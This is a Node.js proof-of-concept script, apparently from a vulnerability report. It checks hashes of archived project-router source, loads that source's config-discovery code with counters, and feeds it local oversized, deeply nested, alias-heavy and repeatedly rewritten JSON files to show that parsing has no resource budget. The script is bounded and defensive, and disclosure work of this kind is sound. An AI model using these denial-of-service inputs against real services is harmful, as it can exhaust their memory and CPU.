#!/usr/bin/env node

import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { performance } from "node:perf_hooks";

const EXPECTED_HASHES = new Map([
  ["project-router/server.mjs", "7ace8ada6839a02abe80b723afa225b83b049789c3fe7e975a4755a32cde65e8"],
  ["project-router/tests/project-router.test.mjs", "a781be8929a064eaa3e1b84cf3e5c5ab9d89fda667e25d8234a1b25e3cc7f5e3"],
  ["compose.runtime-isolation.yaml", "69d7383d8f0d499d0580514e30944a6819e14631619f536587420696d2238fc6"],
  ["control-center/server.mjs", "0e660c3278ebe6d85c83e6852ef0afee6be10e7a434c3b37f0f33154969549b6"],
]);

const OVERSIZED_PADDING_BYTES = 2 * 1024 * 1024;
const SAFE_MAX_FILE_BYTES = 3 * 1024 * 1024;
const NESTING_DEPTH = 4096;
const ALIAS_COUNT = 10000;
const CHANGE_CYCLES = 12;
const MAX_CASE_MS = 5000;

const sourceRoot = path.resolve(process.argv[2] ?? "");
const scratchRoot = path.resolve(process.argv[3] ?? "");
if (!process.argv[2] || !fs.statSync(sourceRoot, { throwIfNoEntry: false })?.isDirectory()
    || !process.argv[3] || path.dirname(sourceRoot) !== path.dirname(scratchRoot)) {
  throw new Error("usage: project-metadata-budget-probe.mjs /path/to/archived/source /sibling/scratch");
}

function sha256File(filePath) {
  return crypto.createHash("sha256").update(fs.readFileSync(filePath)).digest("hex");
}

for (const [relativePath, expected] of EXPECTED_HASHES) {
  assert.equal(sha256File(path.join(sourceRoot, relativePath)), expected, `${relativePath} is not the expected vulnerable source`);
}
console.log("[+] verified 4 embedded vulnerable-source hashes");

const serverSource = fs.readFileSync(path.join(sourceRoot, "project-router/server.mjs"), "utf8");
const testSource = fs.readFileSync(path.join(sourceRoot, "project-router/tests/project-router.test.mjs"), "utf8");
const isolationSource = fs.readFileSync(path.join(sourceRoot, "compose.runtime-isolation.yaml"), "utf8");
const controlCenterSource = fs.readFileSync(path.join(sourceRoot, "control-center/server.mjs"), "utf8");

assert.match(serverSource, /const projects = discoverProjects\(\);[\s\S]{0,240}projects\.find/);
assert.match(serverSource, /const config = readProjectConfig\(projectPath\);/);
assert.ok(serverSource.includes('const projectConfigNames = [".platform/project.json", "platform.project.json"];'));
const readProjectConfigSource = sliceBetween(serverSource, "function readProjectConfig(", "function stringValue(");
assert.ok(readProjectConfigSource.includes('return JSON.parse(readFileSync(configPath, "utf8"));'));
assert.doesNotMatch(readProjectConfigSource, /\b(?:l?statSync|size|digest|cache|budget|limit)\b/i);
assert.match(isolationSource, /project-router:\s*[\s\S]{0,180}cpus:\s*0\.50\s*[\s\S]{0,80}mem_limit:\s*192m/);
assert.match(testSource, /\.platform", "project\.json"/);
assert.match(controlCenterSource, /function readProjectManifest\([\s\S]{0,300}stat\.size > 200000/);
console.log("[+] static call chain=request -> discoverProjects -> readFileSync -> JSON.parse");
console.log("[+] closest control=parse-error catch only; nearby parsers have byte caps but this path has no resource budget");

const projectsRoot = path.join(scratchRoot, "projects");
const moduleSource = buildInstrumentedModule(serverSource, projectsRoot);
assert.doesNotMatch(moduleSource, /createServer|httpRequest|node:http|node:net/);
const router = await import(`data:text/javascript;base64,${Buffer.from(moduleSource).toString("base64")}`);
console.log("[+] loaded exact archived discovery/config functions with filesystem counters");
console.log(`[+] fixture-bounds max_file_bytes=${SAFE_MAX_FILE_BYTES} depth=${NESTING_DEPTH} aliases=${ALIAS_COUNT} change_cycles=${CHANGE_CYCLES} max_case_ms=${MAX_CASE_MS}`);

let networkAttempts = 0;
const originalFetch = globalThis.fetch;
globalThis.fetch = async () => {
  networkAttempts += 1;
  throw new Error("network access is forbidden in this proof");
};

try {
  await runOversizedCase(router);
  await runDeepCase(router);
  await runAliasCase(router);
  await runChangingCase(router);
  assert.equal(networkAttempts, 0);
  console.log("[+] summary vulnerable-cases=4 bounded-fixtures=4 network-attempts=0");
  console.log("[+] no server, socket, container, live project, or external service was accessed");
  console.log("[+] result=VULNERABLE");
} finally {
  fs.rmSync(scratchRoot, { recursive: true, force: true });
  if (originalFetch === undefined) delete globalThis.fetch;
  else globalThis.fetch = originalFetch;
}

async function runOversizedCase(routerModule) {
  const configPath = resetFixture();
  const text = `{"type":"node","padding":"${"A".repeat(OVERSIZED_PADDING_BYTES)}"}`;
  const fileBytes = Buffer.byteLength(text);
  assert.ok(fileBytes > OVERSIZED_PADDING_BYTES && fileBytes <= SAFE_MAX_FILE_BYTES);
  fs.writeFileSync(configPath, text, "utf8");
  routerModule.resetMetrics();
  const measured = await boundedCase("oversized", () => routerModule.discoverProjects());
  const metrics = routerModule.metricsSnapshot();
  assert.equal(measured.value.length, 1);
  assert.equal(metrics.configReads, 1);
  assert.equal(metrics.parseCalls, 1);
  assert.equal(metrics.bytesRead, fileBytes);
  console.log(`[VULNERABLE] case=oversized bytes_read=${metrics.bytesRead} reads=${metrics.configReads} parses=${metrics.parseCalls} elapsed_ms=${measured.elapsedMs}`);
}

async function runDeepCase(routerModule) {
  const configPath = resetFixture();
  const text = `{"type":"node","padding":${"[".repeat(NESTING_DEPTH)}0${"]".repeat(NESTING_DEPTH)}}`;
  assert.ok(Buffer.byteLength(text) <= SAFE_MAX_FILE_BYTES);
  fs.writeFileSync(configPath, text, "utf8");
  routerModule.resetMetrics();
  const measured = await boundedCase("deep", () => routerModule.discoverProjects());
  const metrics = routerModule.metricsSnapshot();
  assert.equal(measured.value.length, 1);
  assert.equal(metrics.configReads, 1);
  assert.equal(metrics.parseCalls, 1);
  console.log(`[VULNERABLE] case=deep nesting_depth=${NESTING_DEPTH} bytes_read=${metrics.bytesRead} parse_ms=${metrics.parseMs.toFixed(3)} elapsed_ms=${measured.elapsedMs}`);
}

async function runAliasCase(routerModule) {
  const configPath = resetFixture();
  const aliases = Array.from({ length: ALIAS_COUNT }, (_, index) => `alias-${index.toString(36).padStart(4, "0")}`);
  const text = JSON.stringify({
    type: "node",
    projects: [{ slug: "alias-target", type: "node", aliases }],
  });
  assert.ok(Buffer.byteLength(text) <= SAFE_MAX_FILE_BYTES);
  fs.writeFileSync(configPath, text, "utf8");
  routerModule.resetMetrics();
  const measured = await boundedCase("high-alias", () => routerModule.discoverProjects());
  const metrics = routerModule.metricsSnapshot();
  assert.equal(measured.value.length, 1);
  assert.equal(measured.value[0].aliases.length, ALIAS_COUNT + 1);
  assert.equal(metrics.configReads, 1);
  assert.equal(metrics.parseCalls, 1);
  console.log(`[VULNERABLE] case=high-alias input_aliases=${ALIAS_COUNT} materialized_aliases=${measured.value[0].aliases.length} bytes_read=${metrics.bytesRead} elapsed_ms=${measured.elapsedMs}`);
}

async function runChangingCase(routerModule) {
  const configPath = resetFixture();
  const observed = new Set();
  routerModule.resetMetrics();
  const measured = await boundedCase("repeatedly-changing", () => {
    for (let index = 0; index < CHANGE_CYCLES; index += 1) {
      const marker = `revision-${index.toString().padStart(2, "0")}`;
      fs.writeFileSync(configPath, JSON.stringify({
        type: "node",
        projects: [{ slug: "rotating-target", type: "node", aliases: [marker] }],
      }), "utf8");
      const projects = routerModule.discoverProjects();
      assert.equal(projects.length, 1);
      assert.ok(projects[0].aliases.includes(marker));
      observed.add(marker);
    }
    return observed.size;
  });
  const metrics = routerModule.metricsSnapshot();
  assert.equal(measured.value, CHANGE_CYCLES);
  assert.equal(metrics.configReads, CHANGE_CYCLES);
  assert.equal(metrics.parseCalls, CHANGE_CYCLES);
  console.log(`[VULNERABLE] case=repeatedly-changing cycles=${CHANGE_CYCLES} versions_observed=${measured.value} reads=${metrics.configReads} parses=${metrics.parseCalls} bytes_read=${metrics.bytesRead} elapsed_ms=${measured.elapsedMs}`);
}

function resetFixture() {
  fs.rmSync(scratchRoot, { recursive: true, force: true });
  const projectPath = path.join(projectsRoot, "fixture-project");
  const platformPath = path.join(projectPath, ".platform");
  fs.mkdirSync(platformPath, { recursive: true });
  fs.writeFileSync(path.join(projectPath, "package.json"), "{}\n", "utf8");
  return path.join(platformPath, "project.json");
}

async function boundedCase(name, callback) {
  const heapBefore = process.memoryUsage().heapUsed;
  const started = performance.now();
  const value = callback();
  const elapsedMs = Number((performance.now() - started).toFixed(3));
  const heapDelta = Math.max(0, process.memoryUsage().heapUsed - heapBefore);
  assert.ok(elapsedMs < MAX_CASE_MS, `${name} exceeded the safe ${MAX_CASE_MS}ms fixture budget`);
  assert.ok(heapDelta < 48 * 1024 * 1024, `${name} exceeded the safe 48MiB observed heap-delta budget`);
  return { value, elapsedMs, heapDelta };
}

function buildInstrumentedModule(source, fixtureProjectsRoot) {
  return `
import fs from "node:fs";
import path from "node:path";
import { performance } from "node:perf_hooks";

const projectsRoot = ${JSON.stringify(fixtureProjectsRoot)};
const projectConfigNames = [".platform/project.json", "platform.project.json"];
const nodeHosts = new Map();
const hostSuffix = ".example.test";
const existsSync = fs.existsSync;
const readdirSync = fs.readdirSync;
const statSync = fs.statSync;
let counters = { configReads: 0, bytesRead: 0, parseCalls: 0, parseMs: 0 };

function readFileSync(filePath, encoding) {
  const value = fs.readFileSync(filePath, encoding);
  if (projectConfigNames.some((name) => String(filePath).endsWith(name))) {
    counters.configReads += 1;
    counters.bytesRead += Buffer.byteLength(value);
  }
  return value;
}

const JSON = {
  parse(value, reviver) {
    counters.parseCalls += 1;
    const started = performance.now();
    try {
      return globalThis.JSON.parse(value, reviver);
    } finally {
      counters.parseMs += performance.now() - started;
    }
  },
};

${sliceBetween(source, "function discoverProjects(", "function expandProjectValue(")}
${sliceBetween(source, "function isPhpProject(", "function isEnabled(")}
${sliceBetween(source, "function slugify(", "function escapeHtml(")}

function resetMetrics() {
  counters = { configReads: 0, bytesRead: 0, parseCalls: 0, parseMs: 0 };
}

function metricsSnapshot() {
  return { ...counters };
}

export { discoverProjects, resetMetrics, metricsSnapshot };
`;
}

function sliceBetween(source, startMarker, endMarker) {
  const start = source.indexOf(startMarker);
  const end = source.indexOf(endMarker, start + startMarker.length);
  assert.notEqual(start, -1, `missing source marker: ${startMarker}`);
  assert.notEqual(end, -1, `missing source marker: ${endMarker}`);
  assert.ok(end > start, `invalid source marker order: ${startMarker}`);
  return source.slice(start, end);
}
